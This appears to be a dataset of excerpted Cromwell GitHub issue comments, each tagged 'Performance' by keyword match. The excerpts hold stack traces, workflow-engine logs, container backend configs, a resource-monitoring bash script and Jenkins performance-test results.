Performance,"nWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:4523,concurren,concurrent,4523,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"nagerActor Successfully started WorkflowActor-dd0b1399-ebb6-4d9b-89ea-7da193994220; 2018-06-07 12:16:52,353 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-07 12:16:52,362 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workfl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99052,concurren,concurrent,99052,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,ncBackendJobExecutionActor$$returnCodeContents$lzycompute(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:548); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:538); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseException: 500 Internal Server Error; Backend Error; 	at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:146); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321); 	at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1065); 	at com.google.api.client.google,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762:2817,concurren,concurrent,2817,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762,1,['concurren'],['concurrent']
Performance,ncurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	at cromwell.e,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:100271,concurren,concurrent,100271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,"nfig. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? queue; String? docker; String? docker_user; """"""; # you should have a submit script as well, ; submit-docker = """"""; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr ${""-p "" + queue} \; -t ${runtime_minutes} ${""-c "" + cpus} --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""## PLACE THE CORRECT CONTAINER COMMAND HERE ##""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }; ```. Thanks everyone for the comments above. Edit: Correct mistype: `String queue? → String? queue`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:3696,queue,queue,3696,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,4,['queue'],['queue']
Performance,"ning in (I'm guessing I'm not totally unique in this). Difficulties like this led me to develop a variant of the script that uses /proc for cpu and memory info. I've inlined it below:; ```; #!/bin/bash; set -Eeuo pipefail. MONITOR_MOUNT_POINT=${MONITOR_MOUNT_POINT:-""/cromwell_root""}; SLEEP_TIME=${SLEEP_TIME:-""10""}. function getCpuUsage() {; # get cpu info just by grep-ing from /proc/stat. Use awk to convert to %; grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {printf ""%.1f%%"", usage}'; }. function getMem() {; # get desired memory value from /proc/meminfo, in GiB, and also; # as a percentage of total; # argument is the label of the desired memory value; cat /proc/meminfo \; | awk -v MEM_FIELD=""$1"" '{; f[substr($1, 1, length($1)-1)] = $2; } END {; printf ""%.2f GiB"", f[MEM_FIELD] / 1048576; }' ; }. function getMemUnavailable() {; # get unavailable memory from /proc/meminfo, in GiB; cat /proc/meminfo \; | awk '{; f[substr($1, 1, length($1)-1)] = $2; } END {; ; if(""MemAvailable"" in f) {; mem_available = f[""MemAvailable""]; } else {; mem_available = f[""MemFree""] + f[""Buffers""] + f[""Cached""]; }; mem_in_use = f[""MemTotal""] - mem_available; printf ""%.2f Gib %.1f%%"", mem_in_use / 1048576, 100 * mem_in_use / f[""MemTotal""] ; }' ; }. function getDisk() {; # get information about disk usage from ""df"" command.; DISK_COLUMN=$(echo ""$1"" | awk '{print tolower($1)}'); MOUNT_POINT=$2; df -h ""$MOUNT_POINT"" \; | sed 's/Mounted on/Mounted-on/' \; | awk -v DISK_COLUMN=$DISK_COLUMN '; FNR==1 {; for(i=1; i<=NF; i++) { f[tolower($i)]=NF-i }; }; FNR>1 {; FIELD_NUM=NF-f[DISK_COLUMN]; if(FIELD_NUM > 0) {; print $(FIELD_NUM); }; }'; }. function runtimeInfo() {; echo [$(date)]; echo \* CPU usage: $(getCpuUsage); echo \* Memory usage: $(getMemUnavailable); echo \* Disk usage: $(getDisk Used $MONITOR_MOUNT_POINT) $(getDisk Use% $MONITOR_MOUNT_POINT); }. echo ==================================; echo =========== MONITORING ===========; echo ==================================; echo --- ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436035027:2289,Cache,Cached,2289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436035027,1,['Cache'],['Cached']
Performance,nit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpe,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:4977,concurren,concurrent,4977,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,2,['concurren'],['concurrent']
Performance,"nit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection.immutable.List.map(List.scala:283); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$1(HealthMonitorServiceActorSpec.scala:40); at org.scalatest.concurrent.Eventually.makeAValiantA",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:5703,concurren,concurrent,5703,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
Performance,"nm, now that i actually look at it i see it's due to those blasted Futures in the signatures. I don't think I agree with just throwing up hands and saying ""here's a potential explosion, let's just wait until we work on scaling"" as this causes the very real possibility of making scalability much worse. On an 8 core system (which is what I think FC uses) it wouldn't take very many of these to wreak massive havoc. Also I don't see how it could be more than a small amount of work to go all the way. Tagging @kcibul in case he wants to overrule me from a product perspective but the number of times we've wound up in trouble when we just handwave situations like this makes me uneasy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1640#issuecomment-257737080:279,scalab,scalability,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1640#issuecomment-257737080,1,['scalab'],['scalability']
Performance,nonfun$updateStatuses$4(OccasionalStatusPollingActor.scala:103); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.updateForStatusNames$1(OccasionalStatusPollingActor.scala:101); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.cromwell$backend$impl$aws$OccasionalStatusPollingActor$$updateStatuses(OccasionalStatusPollingActor.scala:118); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor$$anonfun$receive$1.$anonfun$applyOrElse$1(OccasionalStatusPollingActor.scala:57); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.Future$.$anonfun$apply$1(Future.scala:659); 	at scala.util.Success.$anonfun$map$1(Try.scala:255); 	at scala.util.Success.map(Try.scala:213); 	at scala.concurrent.Future.$anonfun$map$1(Future.scala:292); 	at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:33); 	at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:33); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(Fo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:6388,concurren,concurrent,6388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['concurren'],['concurrent']
Performance,"nstitute.org/job/PerformanceTest-against-Alpha/989/ (3 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/997/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/998/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/999/ (1 total failed workflows, 49 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1000/ (0 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1001/ (0 total failed workflows, 51 min). **After:**. Mean = 0.5, stdev = 0.5. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/985/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/986/ (0 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/987/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/990/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/991/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/992/ (0 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/993/ (1 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/994/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/995/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/996/ (0 total failed workflows, 50 min)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526:1675,Perform,PerformanceTest-against-Alpha,1675,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526,8,['Perform'],['PerformanceTest-against-Alpha']
Performance,nt.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(WorkflowFailSlowSpec.scala:18); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:5896,concurren,concurrent,5896,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,1,['concurren'],['concurrent']
Performance,nt.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$4(WorkflowFailSlowSpec.scala:30); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030:5902,concurren,concurrent,5902,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030,1,['concurren'],['concurrent']
Performance,"o flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); 